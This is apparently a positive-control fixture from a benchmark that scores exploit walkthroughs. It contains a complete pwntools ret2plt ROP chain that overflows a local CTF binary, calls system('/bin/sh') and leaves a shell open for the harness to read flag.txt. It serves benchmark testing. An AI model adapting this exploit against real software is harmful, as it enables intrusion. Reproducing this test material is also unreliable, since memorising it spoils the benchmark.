#!/usr/bin/env python3
"""POSITIVE CONTROL for the walkthrough scorer. Must score CREDITED.

This is the verified ret2plt chain for `02_ret2plt_system`, reduced to exactly
what a follower artifact is supposed to be: it exploits the target and leaves the
process interactive so the harness's injected stdin (`cat flag.txt`) reads the
flag through the shell the exploit obtained.

RUNS FIRST, ALWAYS. If this does not score CREDITED the scorer is broken, and
the three broken fixtures "failing" would be meaningless -- a scorer that credits
nothing looks maximally strict while measuring nothing at all. That is the
`ablate.py` positive-control-first rule.

NOTE what this fixture deliberately does NOT do: it never opens `flag.txt` in
Python. The reference exploit in `benchmark/reference_exploits/` does, to
self-check, and that read would (correctly) trip the scorer's laundering audit.
The distinction is the point: `cat flag.txt` run BY THE SHELL THE EXPLOIT
OBTAINED is the intended solve path; the same read performed by the artifact's
own process is not exploitation.
"""
import os
import sys
import time
import warnings

os.environ.setdefault("TERM", "xterm")
warnings.filterwarnings("ignore")
from pwn import ELF, ROP, context, p64, process  # noqa: E402

context.clear(arch="amd64", os="linux", log_level="error")

BINARY = os.path.join(os.getcwd(), "ret2plt_system")
OFFSET = 72  # buf at rbp-0x40, +8 for the saved rbp -> saved RIP


def main() -> int:
    elf = ELF(BINARY, checksec=False)
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    # The bare `ret` is a 16-byte stack-alignment fixer: glibc's do_system()
    # executes `movaps`, which faults on a misaligned RSP.
    ret = rop.find_gadget(["ret"])[0]
    binsh = next(elf.search(b"/bin/sh\x00"))
    system = elf.plt["system"]

    chain = b"".join(p64(x) for x in (ret, pop_rdi, binsh, system))
    p = process(BINARY, cwd=os.getcwd())
    p.recvuntil(b"Input: ")
    p.send(b"A" * OFFSET + chain)
    # vuln()'s read() asks for 300 bytes; without this pause the kernel can
    # deliver the following line into that same read() and corrupt the payload.
    time.sleep(0.3)
    p.interactive()
    return 0


if __name__ == "__main__":
    sys.exit(main())
